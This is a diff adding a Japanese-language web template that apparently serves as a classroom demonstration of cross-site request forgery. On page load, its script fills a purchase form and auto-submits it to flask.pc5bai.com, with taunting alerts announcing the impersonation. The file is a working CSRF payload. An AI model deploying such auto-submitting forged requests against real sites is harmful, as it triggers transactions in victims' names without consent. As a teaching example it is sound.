@@ -1,0 +1,58 @@
+{% extends "contact/base.html" %}
+{% block content %}
+    <div class="red-area">
+        <form action="https://flask.pc5bai.com/metal/buy/" method="POST">
+            <div class="field">
+                <label for="metal_type">金属:</label>
+                <input type="text" name="metal_type">
+            </div>
+            <div class="field">
+                <label for="weight">重さ:</label>
+                <input type="text" name="weight">
+            </div>
+            <div class="field">
+                <label for="email">連絡先メールアドレス:</label>
+                <input type="text" name="email" required="">
+            </div>
+            <div class="field">
+                <label for="name">お名前:</label>
+                <input type="text" name="name" required="">
+            </div>
+            <input type="submit" value="送信する">
+        </form>
+    </div>
+    <script>
+        function lastMessage(form) {
+            alert('後悔してももう遅いぞ...。そら！')
+            form.submit();
+        }
+
+        function buy() {
+            alert('フフフ...ひっかかったな！')
+
+            var formData = {
+                metal_type: "silver",
+                weight: "100",
+                email: "foo@bar.com",
+                name: "プラチナ太郎",
+            };
+            var form = document.querySelector("form");
+            for (var key in formData) {
+                var input = form.querySelector("input[name=" + key + "]");
+                if (input) {
+                    input.value = formData[key];
+                }
+            }
+
+            alert('オマエになりすまして、 flask.pc5bai.com で銀を売っぱらってやるぞ！')
+
+            setTimeout(function () {
+                lastMessage(form)
+            }, 3000)
+        }
+
+        window.onload = function () {
+            buy();
+        }
+    </script>
+{% endblock %}
